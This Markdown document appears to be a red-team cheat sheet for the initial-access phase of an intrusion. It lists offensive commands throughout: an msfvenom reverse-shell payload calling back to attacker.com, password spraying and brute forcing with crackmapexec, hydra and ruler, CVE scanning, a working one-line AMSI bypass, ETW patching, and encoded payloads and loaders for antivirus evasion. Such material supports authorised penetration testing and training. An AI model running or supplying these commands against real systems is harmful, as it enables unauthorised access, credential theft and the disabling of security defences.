# Initial Access - Fase 2

## Common Entry Points

### Phishing Attacks
```bash
# Email harvesting
theHarvester -d target.com -b all -l 500

# Phishing infrastructure
gophish # Setup phishing campaigns

# Payload generation
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe -o payload.exe
```

### Password Attacks
```bash
# Credential spraying
crackmapexec smb target.com -u users.txt -p 'Welcome123!' --no-bruteforce

# Brute force
hydra -L users.txt -P passwords.txt target.com ssh

# Password spray against O365
ruler --domain target.com brute --users users.txt --passwords passwords.txt
```

### Exploiting Public-Facing Applications
```bash
# Web application testing
nuclei -u https://target.com -t cves/
nikto -h https://target.com

# Known CVEs
searchsploit "Apache 2.4"
msfconsole -q -x "search type:exploit apache"
```

### Supply Chain Attacks
- Identify third-party software
- Check for vulnerable dependencies
- Target update mechanisms

## Evasion Techniques

### EDR Bypass
```powershell
# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW patching
$p = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((...)...)
```

### AV Evasion
```bash
# Obfuscation
Invoke-Obfuscation

# Payload encoding
msfvenom -p windows/x64/meterpreter/reverse_https ... -e x64/xor_dynamic -i 5

# Custom loaders
donut -i payload.exe -o payload.bin
```
